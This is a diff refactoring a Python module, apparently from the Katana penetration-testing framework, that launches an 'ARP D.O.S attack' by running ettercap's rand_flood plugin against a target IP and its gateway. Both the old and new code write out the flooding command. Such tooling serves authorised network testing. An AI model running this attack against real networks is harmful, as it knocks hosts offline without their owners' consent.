@@ -3,12 +3,11 @@
 
 # :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
 # Katana Core import                  #
-from core.KATANAFRAMEWORK import *    #
+from core.KatanaFramework import *    #
 # :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
 
 # LIBRARIES  
-from core.Function import get_gateway,isConect,Subprocess,checkDevice
-import commands              
+              
 # END LIBRARIES 
 
 # INFORMATION MODULE
@@ -28,7 +27,7 @@ def init():
 		# NAME      VALUE               RQ     DESCRIPTION
 		'interface':[INTERFACE_ETHERNET,True ,'Interface'],
 		'target'   :["192.168.1.223"   ,True ,'Target IP'],
-		'gateway'  :[get_gateway()     ,True ,'Gateway IP']
+		'gateway'  :[GATEWAY           ,True ,'Gateway IP']
 	}
 	return init
 # END INFORMATION MODULE
@@ -36,10 +35,10 @@ def init():
 # CODE MODULE    ############################################################################################
 def main(run):
 
-	if isConect() and checkDevice(init.var['interface']):
-		printAlert(0,"Starting ARP D.O.S attack...")
-		Subprocess("ettercap -Tq -P rand_flood /"+init.var['target']+"// /"+init.var['gateway']+"// -i "+init.var['interface'])
-		raw_input(printAlert(8,"to Stop ARP D.O.S Attack (PRESS [ENTER])\n"))
-		commands.getoutput("killall ettercap")	
+	if NET.AmIConectedToANetwork() and NET.CheckIfExistInterface(init.var['interface']):
+		printk.inf("Starting ARP D.O.S attack...")
+		SYSTEM.Subprocess("ettercap -Tq -P rand_flood /"+init.var['target']+"// /"+init.var['gateway']+"// -i "+init.var['interface'])
+		raw_input(printk.pkey("if you want to stop ARP D.O.S Attack (PRESS [ENTER])"))
+		SYSTEM.KillProcess("ettercap")	
 
 # END CODE MODULE ############################################################################################
